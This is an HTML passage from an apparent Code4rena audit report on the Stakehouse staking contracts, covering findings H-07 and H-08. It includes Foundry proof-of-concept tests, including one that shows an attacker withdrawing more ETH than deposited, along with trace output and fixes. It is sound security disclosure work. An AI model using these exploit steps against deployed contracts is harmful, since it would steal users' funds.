class=\"mtk1\">(</span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\"> + </span><span class=\"mtk7\">60</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minutes</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lp</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">lpTokenForKnot</span><span class=\"mtk1\">(</span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">][</span><span class=\"mtk7\">0</span><span class=\"mtk1\">]));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\"> [][] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">LPToken</span><span class=\"mtk1\">[][](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">LPToken</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">temp</span><span class=\"mtk1\">  = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">LPToken</span><span class=\"mtk1\">[](</span><span class=\"mtk7\">1</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">temp</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">lp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">[</span><span class=\"mtk7\">0</span><span class=\"mtk1\">] = </span><span class=\"mtk12\">temp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bringUnusedETHBackIntoGiantPool</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getAddressArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">)),</span><span class=\"mtk12\">lpToken</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">log_uint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">).</span><span class=\"mtk12\">balance</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">giantFeesAndMevPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">batchDepositETHForStaking</span><span class=\"mtk1\">(</span><span class=\"mtk11\">getAddressArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">stakingFundsVault</span><span class=\"mtk1\">)),</span><span class=\"mtk11\">getUint256ArrayFromValues</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">) , </span><span class=\"mtk12\">blsKeysForVaults</span><span class=\"mtk1\">, </span><span class=\"mtk12\">stakeAmountsForVaults</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">expectRevert</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">giantSavETHPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdrawETH</span><span class=\"mtk1\">(</span><span class=\"mtk7\">1</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ether</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">vm</span><span class=\"mtk1\">.</span><span class=\"mtk11\">stopPrank</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Both withdrawing eth for user and depositing eth to stake fails and reverts as shown in the poc due to underflow in idleETH.</p>\n<p>Note that the same problem also exists in GiantSavETHVaultPool, however a poc cannot be done for it as another bug exist in GiantSavETHVaultPool which prevents it from receiving funds as it lacks a receive() or fallback() implementation.</p>\n<h3 id=\"tools-used-3\" style=\"position:relative;\"><a href=\"#tools-used-3\" aria-label=\"tools used 3 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>Foundry</p>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Update <code>idleETH</code> in withdrawUnusedETHToGiantPool</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/115\">vince0656 (Stakehouse) confirmed</a></strong></p>\n<hr>\n<h2 id=\"h-07-giantlp-with-a-transferhookprocessor-cant-be-burned-users-funds-will-be-stuck-in-the-giant-pool\" style=\"position:relative;\"><a href=\"#h-07-giantlp-with-a-transferhookprocessor-cant-be-burned-users-funds-will-be-stuck-in-the-giant-pool\" aria-label=\"h 07 giantlp with a transferhookprocessor cant be burned users funds will be stuck in the giant pool permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/116\">[H-07] GiantLP with a <code>transferHookProcessor</code> cant be burned, users’ funds will be stuck in the Giant Pool</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/116\">ronnyx2017</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/404\">Trust</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/191\">rotcivegaf</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/182\">9svR6w</a>, <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/142\">Lambda</a>, and <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60\">HE1M</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L39-L47\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantLP.sol#L39-L47</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L73-L78\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L73-L78</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L57\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L51-L57</a><br></p>\n<p>The GiantLP with a transferHookProcessor will call <code>transferHookProcessor.beforeTokenTransfer(_from, _to, _amount)</code> when it’s transferred / minted / burned.</p>\n<p>But the <code>to</code> address is address(0x00) in the erc20 <code>_burn</code> function. The GiantMevAndFeesPool.beforeTokenTransfer will call the function <code>SyndicateRewardsProcessor._distributeETHRewardsToUserForToken</code> will a zero address check in the first line:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">function _distributeETHRewardsToUserForToken(...) internal {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require(_recipient != address(0), &quot;Zero address&quot;);</span></span></code></pre>\n<p>So any withdraw function with a operation of burning the GiantLP token with a transferHookProcessor will revert because of the zero address check. The users’ funds will be stuck in the Giant Pool contracts.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I wrote a test about <code>GiantMevAndFeesPool.withdrawETH</code> function which is used to withdraw eth from the Giant Pool. It will be reverted.</p>\n<p>test/foundry/LpBurn.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.13;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {GiantPoolTests} from &quot;./GiantPools.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract LpBurnTests is GiantPoolTests {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testburn() public{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.withdrawETH(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>run test</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">forge test --match-test testburn -vvv</span></span></code></pre>\n<p>test log:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">...</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ├─ [115584] GiantMevAndFeesPool::withdrawETH(4000000000000000000) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   └─ ← 4000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   ├─ [128081] GiantLP::burn(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 4000000000000000000) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   ├─ [126775] GiantMevAndFeesPool::beforeTokenTransfer(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, 0x0000000000000000000000000000000000000000, 4000000000000000000) </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ [371] GiantLP::totalSupply() [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   │   └─ ← 4000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ emit ETHReceived(amount: 4000000000000000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ [585] GiantLP::balanceOf(0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266) [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   │   └─ ← 4000000000000000000</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ [0] 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266::fallback{value: 4000000000000000000}() </span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   │   └─ ← ()</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ emit ETHDistributed(user: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, recipient: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266, amount: 4000000000000000000)</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   ├─ [2585] GiantLP::balanceOf(0x0000000000000000000000000000000000000000) [staticcall]</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   │   └─ ← 0</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   │   └─ ← &quot;Zero address&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   │   └─ ← &quot;Zero address&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    │   └─ ← &quot;Zero address&quot;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    └─ ← &quot;Zero address&quot;</span></span></code></pre>\n<h3 id=\"tools-used-4\" style=\"position:relative;\"><a href=\"#tools-used-4\" aria-label=\"tools used 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>foundry</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Skip update rewards for zero address.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/60#event-7905446439\">vince0656 (Stakehouse) confirmed duplicate issue #60</a></strong></p>\n<hr>\n<h2 id=\"h-08-function-withdraweth-from-giantmevandfeespool-can-steal-most-of-eth-because-of-idleeth-is-reduced-before-burning-token\" style=\"position:relative;\"><a href=\"#h-08-function-withdraweth-from-giantmevandfeespool-can-steal-most-of-eth-because-of-idleeth-is-reduced-before-burning-token\" aria-label=\"h 08 function withdraweth from giantmevandfeespool can steal most of eth because of idleeth is reduced before burning token permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129\">[H-08] function <code>withdrawETH</code> from <code>GiantMevAndFeesPool</code> can steal most of eth because of idleETH is reduced before burning token</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/129\">ronnyx2017</a>, also found by <a href=\"https://github.com/code-423n4/2022-11-stakehouse-findings/issues/239\">cccz</a></em></p>\n<p><a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantPoolBase.sol#L57-L60</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178</a><br>\n<a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L76-L90</a><br></p>\n<p>The contract GiantMevAndFeesPool override the function totalRewardsReceived:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">return address(this).balance + totalClaimed - idleETH;</span></span></code></pre>\n<p>The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function <code>SyndicateRewardsProcessor._updateAccumulatedETHPerLP</code></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"19\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 received = totalRewardsReceived();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">uint256 unprocessed = received - totalETHSeen;</span></span></code></pre>\n<p>But it will decrease the <code>idleETH</code> first and then burn the lpTokenETH in the function <code>GiantMevAndFeesPool.withdrawETH</code>. The lpTokenETH burn option will trigger <code>GiantMevAndFeesPool.beforeTokenTransfer</code> which will call _updateAccumulatedETHPerLP and send the accumulated rewards to the msg sender. Because of the diminution of the idleETH, the <code>accumulatedETHPerLPShare</code> is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>I wrote a test file for proof, but there is another bug/vulnerability which will make the <code>GiantMevAndFeesPool.withdrawETH</code> function break down. I submitted it as the other finding named “GiantLP with a transferHookProcessor cant be burned, users’ funds will be stuck in the Giant Pool”. You should fix it first by modifying the code <a href=\"https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166\">https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L161-L166</a> to :</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"20\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">if (_to != address(0)) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _distributeETHRewardsToUserForToken(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address(lpTokenETH),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        lpTokenETH.balanceOf(_to),</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        _to</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    );</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>I know modifying the project source code is controversial. Please believe me it’s a bug needed to be fixed and it’s independent of the current vulnerability.</p>\n<p>test:<br>\ntest/foundry/TakeFromGiantPools2.t.sol</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"21\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">pragma solidity ^0.8.13;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">// SPDX-License-Identifier: MIT</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import &quot;forge-std/console.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">import {GiantPoolTests} from &quot;./GiantPools.t.sol&quot;;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">contract TakeFromGiantPools2 is GiantPoolTests {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function testDWUpdateRate2() public{</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserOne = accountOne; vm.deal(feesAndMevUserOne, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        address feesAndMevUserTwo = accountTwo; vm.deal(feesAndMevUserTwo, 4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // Deposit ETH into giant fees and mev</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserOne);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.startPrank(feesAndMevUserTwo);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        giantFeesAndMevPool.withdrawETH(4 ether);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        vm.stopPrank();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;user one:&quot;, getBalance(feesAndMevUserOne));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;user two(attacker):&quot;, getBalance(feesAndMevUserTwo));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        console.log(&quot;giantFeesAndMevPool:&quot;, getBalance(address(giantFeesAndMevPool)));</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    function getBalance(address addr) internal returns (uint){</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        // just ETH</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        return addr.balance;  // + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">}</span></span></code></pre>\n<p>run test:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" 